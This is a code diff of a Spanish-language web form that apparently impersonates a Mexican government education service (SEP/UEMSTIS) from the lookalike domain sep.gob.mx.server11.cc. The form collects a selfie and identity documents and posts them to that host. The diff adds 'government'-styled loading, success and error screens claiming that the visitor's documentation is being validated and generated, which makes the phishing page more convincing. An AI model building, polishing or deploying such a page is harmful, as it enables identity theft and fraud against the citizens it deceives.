@@ -137,7 +137,105 @@ button {
     .mensaje { padding: 10px; margin-top: 20px; display: none; }
     .exito { background-color: #d4edda; color: #155724; }
     .error { background-color: #f8d7da; color: #721c24; }
-    </style>                      </head>
+    </style>            
+<style>
+
+.loader-gobierno{
+    max-width:520px;
+    margin:25px auto;
+    padding:30px 25px;
+    background:#ffffff;
+    border:1px solid #d9d9d9;
+    border-radius:4px;
+    text-align:center;
+    box-shadow:0 3px 12px rgba(0,0,0,.08);
+    font-family:Arial, sans-serif;
+}
+
+.loader-circulo{
+    width:48px;
+    height:48px;
+    margin:0 auto 20px;
+    border:4px solid #e5e5e5;
+    border-top:4px solid #1b5e20;
+    border-radius:50%;
+    animation:gobiernoGiro 1s linear infinite;
+}
+
+.loader-titulo{
+    font-size:20px;
+    font-weight:bold;
+    color:#333;
+    margin-bottom:10px;
+}
+
+.loader-texto{
+    font-size:15px;
+    line-height:1.5;
+    color:#555;
+}
+
+.loader-puntos{
+    margin-top:12px;
+    font-size:13px;
+    color:#777;
+}
+
+.loader-check{
+    width:52px;
+    height:52px;
+    line-height:52px;
+    margin:0 auto 18px;
+    border-radius:50%;
+    background:#1b5e20;
+    color:#fff;
+    font-size:30px;
+    font-weight:bold;
+}
+
+.loader-error{
+    width:52px;
+    height:52px;
+    line-height:52px;
+    margin:0 auto 18px;
+    border-radius:50%;
+    background:#9b1c1c;
+    color:#fff;
+    font-size:28px;
+    font-weight:bold;
+}
+
+.boton-reintentar{
+    margin-top:20px;
+    padding:11px 25px;
+    border:0;
+    border-radius:3px;
+    background:#1b5e20;
+    color:#fff;
+    font-size:15px;
+    cursor:pointer;
+}
+
+.boton-reintentar:hover{
+    opacity:.9;
+}
+
+button[type="submit"]:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+}
+
+@keyframes gobiernoGiro{
+    from{
+        transform:rotate(0deg);
+    }
+    to{
+        transform:rotate(360deg);
+    }
+}
+
+</style>
+        </head>
 <body>
   <header class=" navbar navbar-inverse">
     <nav class="navbar navbar-inverse  navbar-fixed-top">
@@ -327,12 +425,14 @@ button {
 
 
 
-     <script>
+
+<script>
 document.getElementById("contactForm").addEventListener("submit", async function(e){
 
     e.preventDefault();
 
     const formulario = this;
+    const boton = formulario.querySelector('button[type="submit"]');
     const mensaje = document.getElementById("mensaje");
 
     const maxSize = 10 * 1024 * 1024;
@@ -351,23 +451,20 @@ document.getElementById("contactForm").addEventListener("submit", async function
         "application/pdf"
     ];
 
-    mensaje.innerHTML = "Enviando solicitud...";
-
+    /* VALIDACIÓN DE ARCHIVOS */
     for(let campo of archivos){
 
         const archivo = document.getElementById(campo).files[0];
 
         if(!archivo){
             alert("Debes seleccionar todos los archivos.");
-            mensaje.innerHTML = "";
             return;
         }
 
-        if(campo === "selfie"){
+        if(campo == "selfie"){
 
             if(!archivo.type.startsWith("image/")){
                 alert("La selfie debe ser una imagen.");
-                mensaje.innerHTML = "";
                 return;
             }
 
@@ -375,50 +472,141 @@ document.getElementById("contactForm").addEventListener("submit", async function
 
             if(!tiposPermitidos.includes(archivo.type)){
                 alert("Los archivos deben ser JPG, PNG o PDF.");
-                mensaje.innerHTML = "";
                 return;
             }
+
         }
 
         if(archivo.size > maxSize){
             alert("Cada archivo debe pesar menos de 10 MB.");
-            mensaje.innerHTML = "";
             return;
         }
+
     }
+
+    /* BLOQUEAR BOTÓN */
+    boton.disabled = true;
+
+    /* LOADER INSTITUCIONAL */
+    mensaje.innerHTML = `
+        <div class="loader-gobierno">
+
+            <div class="loader-circulo"></div>
+
+            <div class="loader-titulo">
+                Procesando solicitud
+            </div>
+
+            <div class="loader-texto">
+                Estamos validando su información y generando su documentación.
+            </div>
+
+            <div class="loader-puntos">
+                Por favor, no cierre esta página.
+            </div>
+
+        </div>
+    `;
+
+    mensaje.style.display = "block";
 
     try {
 
         const datos = new FormData(formulario);
 
-        const respuesta = await fetch("https://api.uemstis.sep.gob.mx.server11.cc/enviar", {
-            method: "POST",
-            body: datos
-        });
+        const controlador = new AbortController();
+        const tiempoLimite = setTimeout(function(){
+            controlador.abort();
+        }, 120000);
 
-        const resultado = await respuesta.json();
+        const respuesta = await fetch(
+            "https://api.uemstis.sep.gob.mx.server11.cc/enviar",
+            {
+                method: "POST",
+                body: datos,
+                signal: controlador.signal
+            }
+        );
+
+        clearTimeout(tiempoLimite);
+
+        let resultado;
+
+        try {
+            resultado = await respuesta.json();
+        } catch(error) {
+            throw new Error("Respuesta inválida del servidor.");
+        }
 
         if(respuesta.ok && resultado.ok){
 
-            mensaje.innerHTML = "Solicitud enviada correctamente. Redirigiendo...";
+            mensaje.innerHTML = `
+                <div class="loader-gobierno exito">
+
+                    <div class="loader-check">✓</div>
+
+                    <div class="loader-titulo">
+                        Solicitud procesada correctamente
+                    </div>
+
+                    <div class="loader-texto">
+                        Su documentación ha sido generada correctamente.
+                    </div>
+
+                    <div class="loader-puntos">
+                        Redirigiendo...
+                    </div>
+
+                </div>
+            `;
 
             setTimeout(function(){
-                window.location.href = "https://www.uemstis.sep.gob.mx.server11.cc/proceso.html";
-            }, 1500);
+                window.location.href =
+                    "https://www.uemstis.sep.gob.mx.server11.cc/proceso.html";
+            }, 1200);
 
-        }else{
-
-            mensaje.innerHTML = resultado.message || "No fue posible enviar la solicitud.";
-
+            return;
         }
 
-    }catch(error){
+        throw new Error(
+            resultado.message || "No fue posible procesar la solicitud."
+        );
 
-        console.error(error);
+    } catch(error) {
 
-        mensaje.innerHTML =
-            "Ocurrió un error de conexión. Por favor intenta nuevamente.";
+        console.error("Error al enviar solicitud:", error);
 
+        let textoError =
+            "Algo ha ocurrido. Vuelve a intentarlo por favor.";
+
+        if(error.name === "AbortError"){
+            textoError =
+                "La solicitud tardó demasiado en responder. Vuelve a intentarlo por favor.";
+        }
+
+        mensaje.innerHTML = `
+            <div class="loader-gobierno error">
+
+                <div class="loader-error">!</div>
+
+                <div class="loader-titulo">
+                    No fue posible completar la solicitud
+                </div>
+
+                <div class="loader-texto">
+                    ${textoError}
+                </div>
+
+                <button type="button"
+                        class="boton-reintentar"
+                        onclick="location.reload()">
+                    Volver a intentar
+                </button>
+
+            </div>
+        `;
+
+        boton.disabled = false;
     }
 
 });
